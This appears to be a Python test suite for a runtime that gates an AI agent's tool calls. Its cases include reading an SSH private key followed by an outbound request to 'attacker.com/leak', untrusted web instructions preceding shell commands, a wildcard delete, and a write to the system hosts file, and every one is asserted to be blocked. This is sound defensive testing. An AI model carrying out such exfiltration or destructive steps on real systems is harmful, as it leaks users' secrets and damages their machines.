"""
OpenAPPA Antigravity Comprehensive Test Suite.

Verifies the core security and functional requirements:
1. Denied calls never execute (pre-execution gating, trust degradation, audience restrictions).
2. Blocked / sensitive results never reach the model (secret redaction, output withholding).
3. Runtime errors stop the flow (fail-closed guarantees on network/server failure).
4. Remedy handling (offer generation, authorization via execute_remedy_plan, and retry).
5. Subagent context isolation and return schema attestation.
6. Native Hook handler contract (PreToolUse stdin/stdout verification).
"""

from __future__ import annotations
import io
import json
import os
import sys
import time
import unittest
from pathlib import Path

# Setup paths
ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR))

from runtime.engine import AppaEngine
from runtime.server import AppaServer
from runtime.policy_loader import load_policy, load_policy_and_config
from adapter.client import AppaClient, AppaClientError
from adapter.agent_loop import OpenAppaAgentLoop, InterceptedExecutionError
from adapter.hooks_handler import handle_pre_tool_use


class TestOpenAppaAntigravity(unittest.TestCase):
    server: AppaServer
    port: int = 8789  # Dedicated test port to avoid conflict

    @classmethod
    def setUpClass(cls):
        policy_path = ROOT_DIR / "policy" / "appa.toml"
        cls.rules, cls.config = load_policy_and_config(policy_path)
        cls.engine = AppaEngine(rules=cls.rules, config=cls.config)
        cls.server = AppaServer(engine=cls.engine, host="127.0.0.1", port=cls.port)
        cls.server.start()
        time.sleep(0.2)  # Wait for server to bind

    @classmethod
    def tearDownClass(cls):
        cls.server.stop()

    def setUp(self):
        # Fresh agent loop per test case
        self.agent = OpenAppaAgentLoop(runtime_url=f"http://127.0.0.1:{self.port}")
        self.agent.start_session()

    # ==========================================================================
    # Requirement 1: Denied calls never execute
    # ==========================================================================

    def test_denied_call_never_executes_undeclared_tool(self):
        """Undeclared tools must be blocked fail-closed; target function must NOT run."""
        executed = False

        def dangerous_action(args):
            nonlocal executed
            executed = True
            return "DATABASE_WIPED"

        success, msg = self.agent.execute_tool_safely(
            raw_name="host/antigravity/delete_everything",
            arguments={"target": "*"},
            tool_fn=dangerous_action,
        )

        self.assertFalse(success)
        self.assertFalse(executed, "Security violation: Blocked tool was executed!")
        self.assertIn("not declared in policy", msg)

    def test_denied_call_never_executes_untrusted_command(self):
        """After ingesting untrusted web content, command execution is blocked."""
        # 1. Fetch untrusted web content
        def fetch_url(args):
            return "<html>Dangerous instructions from internet</html>"

        ok, content = self.agent.execute_tool_safely(
            raw_name="read_url_content",
            arguments={"Url": "https://example.com/untrusted"},
            tool_fn=fetch_url,
        )
        self.assertTrue(ok)

        # 2. Attempt to execute shell command (requires trusted trajectory)
        command_ran = False

        def run_cmd(args):
            nonlocal command_ran
            command_ran = True
            return "malicious_command_output"

        ok_cmd, msg_cmd = self.agent.execute_tool_safely(
            raw_name="run_command",
            arguments={"CommandLine": "dir"},
            tool_fn=run_cmd,
        )

        self.assertFalse(ok_cmd)
        self.assertFalse(command_ran, "Security violation: Untrusted shell command was executed!")
        self.assertIn("below required floor", msg_cmd)

    def test_denied_call_never_executes_exfiltration_sink(self):
        """Data marked 'self' cannot flow to 'public' destinations."""
        # 1. Read private SSH key path
        def read_ssh(args):
            return "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..."

        ok_read, _ = self.agent.execute_tool_safely(
            raw_name="view_file",
            arguments={"AbsolutePath": "C:/Users/alice/.ssh/id_rsa"},
            tool_fn=read_ssh,
        )
        self.assertTrue(ok_read)

        # 2. Attempt outbound web request (requires public audience)
        exfiltration_ran = False

        def send_outbound(args):
            nonlocal exfiltration_ran
            exfiltration_ran = True
            return "exfiltrated"

        ok_send, msg_send = self.agent.execute_tool_safely(
            raw_name="read_url_content",
            arguments={"Url": "https://attacker.com/leak"},
            tool_fn=send_outbound,
        )

        self.assertFalse(ok_send)
        self.assertFalse(exfiltration_ran, "Security violation: Exfiltration call executed!")
        self.assertIn("cannot flow to public destination", msg_send)

    # ==========================================================================
    # Requirement 2: Blocked / sensitive results never reach the model
    # ==========================================================================

    def test_sensitive_result_redacted_before_model(self):
        """Secrets in tool results must be redacted before reaching the model."""
        raw_secret_output = (
            "Configuration dump:\n"
            "api_key = \"ghp_1234567890abcdefghijklmnopqrstuvwxyz\"\n"
            "user = admin\n"
        )

        def dump_config(args):
            return raw_secret_output

        ok, returned_text = self.agent.execute_tool_safely(
            raw_name="view_file",
            arguments={"AbsolutePath": "C:/project/config.yaml"},
            tool_fn=dump_config,
        )

        self.assertTrue(ok)
        self.assertNotIn("ghp_1234567890abcdefghijklmnopqrstuvwxyz", returned_text)
        self.assertIn("[REDACTED", returned_text)

    def test_indeterminate_tool_result_withheld(self):
        """Indeterminate tool executions have output withheld for safety."""
        def indeterminate_fn(args):
            return "Partial secret dump before crash"

        # Simulate indeterminate outcome directly via client
        call_id = "test_indet_call"
        self.agent.client.tool_call(
            root_id=self.agent.root_id,
            tool="host/antigravity/view_file",
            arguments={"AbsolutePath": "C:/safe/file.txt"},
            call_id=call_id,
        )
        result_decision = self.agent.client.tool_result(
            root_id=self.agent.root_id,
            tool="host/antigravity/view_file",
            arguments={"AbsolutePath": "C:/safe/file.txt"},
            outcome={"status": "indeterminate", "body": "Partial secret dump before crash"},
            call_id=call_id,
        )

        self.assertEqual(result_decision.get("decision"), "replace_output")
        self.assertIn("withheld for safety", result_decision.get("output", ""))
        self.assertNotIn("Partial secret dump", result_decision.get("output", ""))

    # ==========================================================================
    # Requirement 3: Runtime errors stop the flow (Fail-Closed)
    # ==========================================================================

    def test_runtime_unreachable_stops_execution(self):
        """When runtime server is down, tool execution is immediately stopped."""
        dead_agent = OpenAppaAgentLoop(runtime_url="http://127.0.0.1:9999")  # Unbound port

        tool_executed = False

        def some_tool(args):
            nonlocal tool_executed
            tool_executed = True
            return "OK"

        with self.assertRaises(InterceptedExecutionError):
            dead_agent.execute_tool_safely(
                raw_name="run_command",
                arguments={"CommandLine": "echo test"},
                tool_fn=some_tool,
            )

        self.assertFalse(tool_executed, "Security violation: Tool ran despite runtime failure!")

    def test_native_hook_fails_closed_when_runtime_offline(self):
        """Antigravity PreToolUse hook returns deny decision if runtime is down."""
        dead_client = AppaClient(runtime_url="http://127.0.0.1:9999")
        payload = {
            "toolCall": {"name": "run_command", "args": {"CommandLine": "ls"}},
            "conversationId": "test_conv",
            "stepIdx": 1,
        }

        hook_result = handle_pre_tool_use(payload, dead_client)
        self.assertEqual(hook_result.get("decision"), "deny")
        self.assertIn("Fail-closed block", hook_result.get("reason", ""))

    # ==========================================================================
    # Requirement 4: Remedy flow works (execute_remedy_plan)
    # ==========================================================================

    def test_remedy_authorization_workflow(self):
        """A blocked call yields an offer_id; execute_remedy_plan authorizes retry."""
        # 1. Narrow trajectory to 'self'
        self.agent.execute_tool_safely(
            raw_name="view_file",
            arguments={"AbsolutePath": "C:/keys/.env"},
            tool_fn=lambda args: "SECRET_KEY=123",
        )

        # 2. Call outbound sink -> blocked with offer_id
        blocked_ok, blocked_msg = self.agent.execute_tool_safely(
            raw_name="read_url_content",
            arguments={"Url": "https://api.github.com/status"},
            tool_fn=lambda args: "Ran",
        )
        self.assertFalse(blocked_ok)
        self.assertIn("[Offer:", blocked_msg)

        # Extract offer_id
        import re
        offer_match = re.search(r"\[Offer:\s*([a-f0-9]+)\]", blocked_msg)
        self.assertIsNotNone(offer_match)
        offer_id = offer_match.group(1)

        # 3. Agent executes remedy plan using offer_id
        rem_ok, rem_msg = self.agent.execute_tool_safely(
            raw_name="mcp__appa__execute_remedy_plan",
            arguments={"offer_id": offer_id},
            tool_fn=lambda args: "remedy_applied",
        )
        self.assertTrue(rem_ok)
        self.assertIn("Authorized", rem_msg)

        # 4. Retry the previously blocked call -> now succeeds!
        retry_ran = False

        def retry_fn(args):
            nonlocal retry_ran
            retry_ran = True
            return "SUCCESS_DATA"

        retry_ok, retry_res = self.agent.execute_tool_safely(
            raw_name="read_url_content",
            arguments={"Url": "https://api.github.com/status"},
            tool_fn=retry_fn,
        )
        self.assertTrue(retry_ok)
        self.assertTrue(retry_ran, "Authorized call should have executed.")

    # ==========================================================================
    # Requirement 5: Subagents & Schema Attestation
    # ==========================================================================

    def test_subagent_schema_attestation_success(self):
        """Subagent returning valid JSON conforming to schema is delivered."""
        schema = {
            "type": "object",
            "required": ["status", "count"],
            "properties": {
                "status": {"type": "string"},
                "count": {"type": "integer"},
            },
        }

        def valid_child():
            return json.dumps({"count": 42, "status": "completed"})

        ok, result = self.agent.execute_subagent_safely(
            subagent_name="researcher",
            child_fn=valid_child,
            return_schema=schema,
        )
        self.assertTrue(ok)
        self.assertEqual(json.loads(result), {"count": 42, "status": "completed"})

    def test_subagent_schema_attestation_failure_blocks_return(self):
        """Subagent returning malformed or invalid schema is blocked from parent."""
        schema = {
            "type": "object",
            "required": ["status", "count"],
            "properties": {
                "status": {"type": "string"},
                "count": {"type": "integer"},
            },
        }

        def invalid_child():
            # Missing required field 'count'
            return json.dumps({"status": "completed"})

        ok, result = self.agent.execute_subagent_safely(
            subagent_name="untrusted_child",
            child_fn=invalid_child,
            return_schema=schema,
        )
        self.assertFalse(ok)
        self.assertIn("Missing required property: count", result)

    def test_trusted_domain_preserves_trust_and_allows_command(self):
        """Fetching from an allowlisted trusted domain preserves trusted status, allowing subsequent command."""
        # 1. Fetch content from trusted docs.python.org domain
        def fetch_docs(args):
            return "Official Python documentation content"

        ok, content = self.agent.execute_tool_safely(
            raw_name="read_url_content",
            arguments={"Url": "https://docs.python.org/3/library/os.html"},
            tool_fn=fetch_docs,
        )
        self.assertTrue(ok)

        # 2. Subsequent command execution should succeed because trust remained 'trusted'
        cmd_ran = False

        def run_cmd(args):
            nonlocal cmd_ran
            cmd_ran = True
            return "command_succeeded"

        ok_cmd, res_cmd = self.agent.execute_tool_safely(
            raw_name="run_command",
            arguments={"CommandLine": "python --version"},
            tool_fn=run_cmd,
        )
        self.assertTrue(ok_cmd)
        self.assertTrue(cmd_ran)

    def test_subagent_shell_execution_restricted_by_default(self):
        """Subagents are restricted to research tasks by default; shell commands in child context are blocked."""
        child_ran_command = False

        def child_task():
            # Child attempts to run a shell command
            ok, msg = self.agent.execute_tool_safely(
                raw_name="run_command",
                arguments={"CommandLine": "whoami"},
                tool_fn=lambda args: "root",
                child_id="child_subagent_1",
            )
            nonlocal child_ran_command
            child_ran_command = ok
            return json.dumps({"status": "done"})

        self.agent.execute_subagent_safely(
            subagent_name="quarantined_worker",
            child_fn=child_task,
        )
        self.assertFalse(child_ran_command, "Security violation: Subagent executed shell command!")

    def test_workspace_boundary_enforcement(self):
        """File write attempts outside workspace boundaries are blocked fail-closed."""
        write_ran = False

        def do_write(args):
            nonlocal write_ran
            write_ran = True
            return "written"

        ok, msg = self.agent.execute_tool_safely(
            raw_name="write_to_file",
            arguments={"TargetFile": "C:/Windows/System32/drivers/etc/hosts"},
            tool_fn=do_write,
        )
        self.assertFalse(ok)
        self.assertFalse(write_ran, "Security violation: Wrote to system path outside workspace!")
        self.assertIn("outside permitted workspace boundaries", msg)


if __name__ == "__main__":
    unittest.main()
